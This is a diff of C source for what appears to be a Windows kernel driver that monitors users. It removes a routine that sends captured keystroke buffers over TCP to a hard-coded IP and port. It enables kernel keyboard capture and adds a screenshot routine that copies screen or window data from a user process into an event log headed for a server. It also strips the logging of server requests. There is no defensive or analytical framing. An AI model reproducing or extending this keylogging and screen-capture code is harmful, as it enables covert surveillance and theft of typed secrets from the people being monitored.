@@ -15,70 +15,6 @@
 
 static MONITOR g_Monitor;
 
-NTSTATUS MonitorSendKbdBufWorker(PKBD_BUFF_ENTRY BuffEntry)
-{
-	NTSTATUS Status;
-	SOCKADDR_IN LocalAddress;
-	SOCKADDR_IN RemoteAddress;
-	PMSOCKET Socket = NULL;
-	UNICODE_STRING NodeName = RTL_CONSTANT_STRING(L"10.30.16.93");
-	UNICODE_STRING ServiceName = RTL_CONSTANT_STRING(L"40008");
-	UNICODE_STRING RemoteName = { 0, 0, NULL };
-	PMONITOR Monitor = MonitorGetInstance();
-
-	IN4ADDR_SETANY(&LocalAddress);
-
-	Status = MWskResolveName(
-		Monitor->WskContext,
-		&NodeName,
-		&ServiceName,
-		NULL,
-		&RemoteAddress
-		);
-
-	if (!NT_SUCCESS(Status)) {
-		KLog(LError, "MWskResolveName error %x for name %wZ %wZ", Status, &NodeName, &ServiceName);
-		goto cleanup;
-	}
-
-	Status = MWskSockAddrToStr(&RemoteAddress, &RemoteName);
-	if (!NT_SUCCESS(Status)) {
-		KLog(LError, "MWskSockAddrToStr failure %x", Status);
-		goto cleanup;
-	}
-
-	//KLog(LInfo, "Remote name %ws", RemoteName.Buffer);
-
-	Status = MWskSocketConnect(Monitor->WskContext, SOCK_STREAM, IPPROTO_TCP, (PSOCKADDR)&LocalAddress, (PSOCKADDR)&RemoteAddress, &Socket);
-	if (!NT_SUCCESS(Status)) {
-		KLog(LError, "MWskSocketConnect error %x", Status);
-		goto cleanup;
-	}
-
-	Status = MWskSendAll(Socket, BuffEntry->Bytes, BuffEntry->BytesUsed, NULL);
-	if (!NT_SUCCESS(Status)) {
-		KLog(LError, "MWskSendAll error %x", Status);
-	}
-
-cleanup:
-    if (RemoteName.Buffer != NULL) {
-        ExFreePool(RemoteName.Buffer);
-    }
-
-    if (Socket != NULL)
-        MWskSocketRelease(Socket);
-
-	KbdBuffDelete(BuffEntry);
-
-	return Status;
-}
-
-VOID MonitorSendKbdBuf(PMONITOR Monitor, PVOID BuffEntry)
-{
-	KLog(LInfo, "MonitorSendKbdBuf EMPTY!!!");
-//	SysWorkerAddWork(&Monitor->NetWorker, MonitorSendKbdBufWorker, BuffEntry);
-}
-
 PMONITOR
 	MonitorGetInstance(VOID)
 {
@@ -283,13 +219,14 @@ NTSTATUS
 		KLog(LError, "SysWorkerStart failed err=%x", Status);
 		goto start_failed;
 	}
-	
+
+#if 0	
 	{
 		ULONG Index = 0;
 		for (Index = 0; Index < 100; Index++)
 			SysWorkerAddWork(&Monitor->RequestWorker, MonitorCallServerTestWorker, NULL);
 	}
-
+#endif
 	Status = EventLogStart(&Monitor->EventLog);
 	if (!NT_SUCCESS(Status)) {
 		KLog(LError, "EventLogStart failed err=%x", Status);
@@ -302,13 +239,14 @@ NTSTATUS
 		KLog(LError, "InjectStart failed err=%x", Status);
 		goto start_failed;
 	}
+	*/
 
 	Status = KbdStart(&Monitor->Kbd);
 	if (!NT_SUCCESS(Status)) {
 		KLog(LError, "KbdStart failed err=%x", Status);
 		goto start_failed;
 	}
-	*/
+	
 	Monitor->State = MONITOR_STATE_STARTED;
 	KeReleaseGuardedMutex(&Monitor->Mutex);
 
@@ -365,8 +303,9 @@ MonitorStopInternal(PMONITOR Monitor, PKMON_RELEASE ReleaseData)
 			goto unlock;
 		}
 	}
-	/*
+	
 	KbdStop(&Monitor->Kbd);
+	/*
 	InjectStop(&Monitor->Inject);
 	*/
 	SysWorkerStop(&Monitor->RequestWorker);
@@ -625,8 +564,6 @@ PSREQUEST MonitorCallServer(PSREQUEST request)
 		goto cleanup;
 	}
 	
-	KLog(LInfo, "json request=%s", jsonRequest);
-
 	jsonResponse = MonitorJsonServer(jsonRequest);
 	if (jsonResponse == NULL) {
 		KLog(LError, "no json response");
@@ -634,7 +571,6 @@ PSREQUEST MonitorCallServer(PSREQUEST request)
 		if (response != NULL)
 			response->status = SREQ_ERROR_NO_RESPONSE;
 	} else {
-		KLog(LInfo, "received json response=%s", jsonResponse);
 		response = SRequestParse(jsonResponse);
 		if (response == NULL) {
 			KLog(LError, "cant decode jsonResponse=%s", jsonResponse);
@@ -652,4 +588,78 @@ cleanup:
 		ExFreePool(jsonRequest);
 
 	return response;
+}
+
+NTSTATUS MonitorScreenshotWorker(PKMON_SCREENSHOT Screenshot)
+{
+	NTSTATUS Status;
+	BOOLEAN bProcAcquired = FALSE;
+	KAPC_STATE ApcState;
+	PSREQUEST request = NULL;
+
+	request = SRequestCreateData((Screenshot->type == KMON_SCREENSHOT_SCREENSHOT_TYPE) ? SREQ_TYPE_SCREENSHOT : SREQ_TYPE_USER_WINDOW, Screenshot->dataSz);
+	if (request == NULL) {
+		KLog(LError, "cant create srequest for dataSz=%x", Screenshot->dataSz);
+		Status = STATUS_NO_MEMORY;
+		goto cleanup;
+	}
+	
+	Status = PsAcquireProcessExitSynchronization(Screenshot->Process);
+	if (!NT_SUCCESS(Status)) {
+		KLog(LError, "Cant acquire process=%p, error=%x", Screenshot->Process, Status);
+		goto cleanup;
+	}
+	bProcAcquired = TRUE;
+
+	KeEnterGuardedRegion();
+	KeStackAttachProcess(Screenshot->Process, &ApcState);
+	
+	RtlCopyMemory(request->data, Screenshot->data, request->dataSz);
+
+	KeUnstackDetachProcess(&ApcState);
+	KeLeaveGuardedRegion();
+
+	Status = EventLogAdd(&MonitorGetInstance()->EventLog, request);
+	if (!NT_SUCCESS(Status)) {
+		KLog(LError, "EventLogAdd failed with err=%x", Status);
+		SRequestDelete(request);
+	}
+	
+cleanup:
+	if (bProcAcquired)
+		PsReleaseProcessExitSynchronization(Screenshot->Process);
+
+	Screenshot->Error = RtlNtStatusToDosError(Status);
+
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS
+MonitorScreenshot(PKMON_SCREENSHOT ScreenShot)
+{
+	PSYS_WRK_ITEM WrkItem = NULL;
+	NTSTATUS Status;
+
+	ScreenShot->Error = RtlNtStatusToDosError(STATUS_UNSUCCESSFUL);
+
+	ScreenShot->Process = PsGetCurrentProcess();
+	ObReferenceObject(ScreenShot->Process);
+
+	WrkItem = SysWorkerAddWorkRef(&MonitorGetInstance()->RequestWorker, MonitorOpenWinstaWorker, ScreenShot);
+	if (WrkItem == NULL) {
+		KLog(LError, "Cant queue wrk item");
+		Status = STATUS_UNSUCCESSFUL;
+		goto cleanup;
+	}
+
+	KeWaitForSingleObject(&WrkItem->CompletionEvent, Executive, KernelMode, FALSE, NULL);
+	SYS_WRK_ITEM_DEREF(WrkItem)
+
+	Status = STATUS_SUCCESS;
+
+cleanup:
+	ObDereferenceObject(ScreenShot->Process);
+	ScreenShot->Process = NULL;
+
+	return Status;
 }
